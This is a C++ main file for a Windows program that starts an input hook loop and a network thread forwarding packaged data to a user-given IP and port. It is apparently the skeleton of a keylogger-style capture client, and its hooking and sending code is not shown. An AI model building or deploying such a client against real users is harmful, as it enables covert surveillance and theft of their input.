#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <boost/thread.hpp>
#include "Hooker.hh"
#include "reseau/Network.hh"

int main(int ac, char **av)
{
	if (ac >= 3)
	{
		try {
			Packager* packager = new Packager();
			Network* network = new Network(av[2], av[1], packager);
			Hooker& hooker = Hooker::getInstance();
			hooker.setPackager(packager);
			boost::thread networkThread(&Network::networkLoop, network);
			hooker.runHookLoop();
			networkThread.join();
		}
		catch (std::exception& e) {
			(void)e;
			std::cerr << "An error occured" << std::endl;
			return EXIT_FAILURE;
		}
		return EXIT_SUCCESS;
	}
	std::cerr << "Usage: " << av[0] << " [ip]" << " [port]" << std::endl;
	return EXIT_FAILURE;
}
